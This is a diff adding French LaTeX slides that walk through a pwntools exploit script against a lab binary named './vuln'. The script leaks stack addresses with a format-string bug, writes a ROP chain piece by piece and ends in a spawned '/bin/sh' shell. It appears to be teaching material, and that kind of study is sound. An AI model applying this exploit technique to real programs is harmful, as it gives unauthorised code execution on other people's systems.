@@ -1,0 +1,115 @@
+\section{Script d'exploitation}
+
+% --- Slide 1 : Configuration et Leak ---
+\begin{frame}[fragile]{Script -- Configuration et leak des adresses}
+    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
+from pwn import *
+import re
+
+prog = "./vuln"
+context.arch = 'amd64'
+p = process(prog)
+
+# Offsets
+OFFSET_BUFFER = 16
+DIST_BUFFER_RBP = 80
+DIST_SAVEDRBP_RBP = 0x20
+DIST_SAVEDRIP_GADGET = -0x70
+DIST_SAVEDRIP_SYSTEM = 0x3F3
+DIST_SAVEDRIP_RET = -0x6
+
+# === Etape 1 : Leak des adresses ===
+p.recvuntil(b"address to ping:")
+payload = "%26$16p | %27$16p%203c%7$hhn"
+p.sendline(payload.encode())
+
+raw_response = p.recvuntil(b"ping").decode(errors='ignore')
+leaks = re.findall(r"(0x[0-9a-fA-F]+)", raw_response)
+saved_rbp = int(leaks[0], 16)
+saved_rip = int(leaks[1], 16)
+    \end{lstlisting}
+
+    \begin{itemize}
+        \item Leak de \texttt{Saved RBP} (offset 26) et \texttt{Saved RIP} (offset 27)
+        \item Simultanément : écriture de \texttt{0xEE} sur le LSB pour maintenir la boucle
+    \end{itemize}
+\end{frame}
+
+% --- Slide 2 : Calcul des adresses et ROP chain ---
+\begin{frame}[fragile]{Script -- Calcul des adresses et ROP chain}
+    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
+# === Etape 2 : Calcul des adresses ===
+addr_rbp = saved_rbp - DIST_SAVEDRBP_RBP
+addr_ret = saved_rip - DIST_SAVEDRIP_RET
+addr_system = saved_rip - DIST_SAVEDRIP_SYSTEM
+addr_gadget = saved_rip - DIST_SAVEDRIP_GADGET
+addr_str = addr_rbp + 40
+addr_rip = addr_rbp + 8
+
+# Definition de la chaine ROP
+rop_chain = {
+    addr_rbp + 16 : addr_gadget,         # pop rdi; ret
+    addr_rbp + 24 : addr_str,            # adresse de "/bin/sh"
+    addr_rbp + 32 : addr_system,         # system@plt
+    addr_rbp + 40 : u64(b'/bin/sh\x00'), # chaine brute
+}
+    \end{lstlisting}
+
+    \vspace{0.2cm}
+    \textbf{Distances relatives} calculées depuis le Saved RIP :
+    \begin{itemize}
+        \item Gadget \texttt{pop rdi; ret} : \texttt{+0x70} | System : \texttt{-0x3F3} | Gadget \texttt{ret} : \texttt{+0x6}
+    \end{itemize}
+\end{frame}
+
+% --- Slide 3 : Boucle d'écriture ---
+\begin{frame}[fragile]{Script -- Boucle d'écriture de la ROP chain}
+    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
+# === Etape 3 : Ecriture de la chaine ROP ===
+for addr, value in rop_chain.items():
+    mask32 = (1 << 32) - 1
+    writes_sequence = [
+        (addr, value & mask32),
+        (addr + 4, (value >> 32) & mask32),
+    ]
+    for target_addr, part_value in writes_sequence:
+        p.recvuntil(b"Please Insert an IP address to ping: ")
+        current_writes = {
+            target_addr: part_value,  # Partie de la ROP chain
+            addr_rip: 0xee           # Maintien de la boucle
+        }
+        payload = fmtstr_payload(
+            offset=OFFSET_BUFFER,
+            writes=current_writes,
+            write_size='short'
+        )
+        p.sendline(payload)
+    \end{lstlisting}
+
+    \begin{itemize}
+        \item Chaque valeur 64 bits est écrite en 2 blocs de 32 bits (LSB puis MSB)
+        \item \texttt{0xEE} est réécrit à chaque itération pour boucler sur \texttt{makePing}
+    \end{itemize}
+\end{frame}
+
+% --- Slide 4 : Déclenchement final ---
+\begin{frame}[fragile]{Script -- Déclenchement final}
+    \begin{lstlisting}[language=Python, basicstyle=\ttfamily\tiny\color{black}]
+# === Etape 4 : Trigger ===
+addr_ret_lsb = addr_ret & 0xff
+
+payload = f"%{addr_ret_lsb}c%7$hhn"
+p.recvuntil("Please Insert an IP address to ping: ".encode())
+p.sendline(payload.encode())
+
+p.interactive()
+    \end{lstlisting}
+
+    \vspace{0.3cm}
+    \textbf{Dernière itération :}
+    \begin{itemize}
+        \item On n'écrit plus \texttt{0xEE} (boucle) mais \texttt{0xF9} (gadget \texttt{ret})
+        \item Le flux d'exécution glisse vers la ROP chain $\rightarrow$ \texttt{system("/bin/sh")}
+        \item[$\Rightarrow$] \textbf{Shell obtenu}
+    \end{itemize}
+\end{frame}
